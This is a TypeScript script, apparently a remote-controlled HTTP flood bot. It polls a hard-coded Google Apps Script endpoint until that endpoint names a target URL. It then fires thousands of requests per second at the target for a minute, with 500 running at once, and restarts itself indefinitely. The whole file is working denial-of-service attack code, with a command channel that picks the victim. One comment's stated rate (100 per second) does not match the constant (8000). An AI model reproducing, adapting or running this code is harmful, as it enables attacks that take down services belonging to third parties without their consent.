type GasResponse = {
  url: string | null;
};

const ENDPOINT =
  "https://script.google.com/macros/s/AKfycbwnHiwm6I0kLaWYy2hK4goQ1VMbumTRtn1O-wzIUlWCxjlgk1qFrDpXRVno4XgEDtDeJw/exec";

const REQUESTS_PER_SECOND = 8000;
const DURATION_SECONDS = 60;
const CONCURRENT = 500;

const sleep = (ms: number) => new Promise(r => setTimeout(r, ms));

async function requestLoop() {
  let targetUrl: string | null = null;

  // === URL取得フェーズ（1秒ポーリング）===
  while (!targetUrl) {
    try {
      const res = await fetch(ENDPOINT);
      if (!res.ok) throw new Error(`HTTP ${res.status}`);

      const data = (await res.json()) as GasResponse;

      if (typeof data.url === "string" && data.url !== "null") {
        targetUrl = data.url;
        console.log(`Received target URL: ${targetUrl}`);
      } else {
        console.log("Response was null, retrying...");
      }
    } catch (e) {
      console.error(
        "Error fetching from endpoint:",
        e instanceof Error ? e.message : e
      );
    }

    await sleep(1000);
  }

  // === 送信フェーズ（1秒ごとに100RPS）===
  const endTime = Date.now() + DURATION_SECONDS * 1000;

  while (Date.now() < endTime) {
    const promises: Promise<void>[] = [];

    for (let i = 0; i < REQUESTS_PER_SECOND; i++) {
      promises.push(
        fetch(targetUrl)
          .then(res => {
            if (!res.ok) {
              console.error(`Received error response: ${res.status}`);
            }
          })
          .catch(e => {
            console.error(
              "Error requesting target URL:",
              e instanceof Error ? e.message : e
            );
          })
      );

      // 並列数制限
      if (promises.length >= CONCURRENT) {
        await Promise.all(promises.splice(0));
      }
    }

    await Promise.all(promises);
    await sleep(1000);
  }

  console.log("Finished sending requests.");

  // === 元コードと同じ：終わったら自分を呼び直す ===
  requestLoop();
}

// === 初回起動 ===
requestLoop();

